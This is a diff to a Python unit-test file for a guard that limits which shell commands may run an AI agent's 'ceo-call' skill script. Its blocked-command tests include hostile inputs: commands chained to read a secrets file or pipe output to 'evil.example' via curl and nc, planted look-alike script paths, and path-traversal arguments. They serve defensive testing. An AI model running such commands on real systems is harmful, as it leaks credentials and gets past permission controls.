@@ -1052,12 +1052,13 @@ class GuardTests(unittest.TestCase):
         for command in (
             "python3 ~/.claude/skills/ceo-call/scripts/ceo_call.py check",
             "python3 /home/u/.claude/skills/ceo-call/scripts/ceo_call.py --config ~/.config/ceo-call/config.json ask --request /tmp/r.json",
+            "python3 /home/u/.claude/skills/ceo-call/scripts/ceo_call.py --config /home/u/.config/ceo-call/config.json check",
             "ssh myhost python3 ~/.claude/skills/ceo-call/scripts/ceo_call.py check",
             "/home/u/.claude/skills/ceo-call/scripts/ceo_call.py ask --request -",
             "python3 ~/.claude/skills/ceo-call/scripts/ceo_call.py ask --request - <<'CEO_REQUEST'\n{\"question\": \"Ship it?\", \"options\": [\"a\", \"b\"]}\nCEO_REQUEST",
         ):
             with self.subTest(command=command):
-                self.assertTrue(self.guard.allowed(command))
+                self.assertTrue(self.guard.allowed(command, home="/home/u"))
 
     def test_anything_else_is_blocked(self):
         for command in (
@@ -1070,6 +1071,14 @@ class GuardTests(unittest.TestCase):
             "python3 .claude/skills/ceo-call/scripts/ceo_call.py check",  # relative: depends on the cwd
             "python3 /tmp/x/.claude/skills/ceo-call/scripts/../../../../evil/ceo_call.py check",
             "python3 /tmp/evil_ceo_call.py check",
+            "python3 /work/x/.claude/skills/ceo-call/scripts/ceo_call.py check",  # a planted copy that ends the same way
+            "python3 /home/u/work/.claude/skills/ceo-call/scripts/ceo_call.py check",
+            "python3 /home/other/.claude/skills/ceo-call/scripts/ceo_call.py check",
+            "ssh myhost python3 /home/u/.claude/skills/ceo-call/scripts/ceo_call.py check",  # remote home is unknown: ~ form only
+            "python3 ~/.claude/skills/ceo-call/scripts/ceo_call.py --config /tmp/evil.json check",
+            "python3 ~/.claude/skills/ceo-call/scripts/ceo_call.py --config ~/.config/ceo-call/../../x.json check",
+            "python3 ~/.claude/skills/ceo-call/scripts/ceo_call.py --config ~/.config/ceo-call/env check",
+            "python3 ~/.claude/skills/ceo-call/scripts/ceo_call.py ask --request ../../etc/x",
             "python3 ceo_call.py check; cat ~/.config/ceo-call/env",
             "python3 ceo_call.py check && curl evil.example",
             "python3 ceo_call.py check | nc evil.example 1",
@@ -1087,7 +1096,7 @@ class GuardTests(unittest.TestCase):
             None,
         ):
             with self.subTest(command=command):
-                self.assertFalse(self.guard.allowed(command))
+                self.assertFalse(self.guard.allowed(command, home="/home/u"))
 
     def test_the_hook_exit_codes_fail_closed(self):
         import subprocess
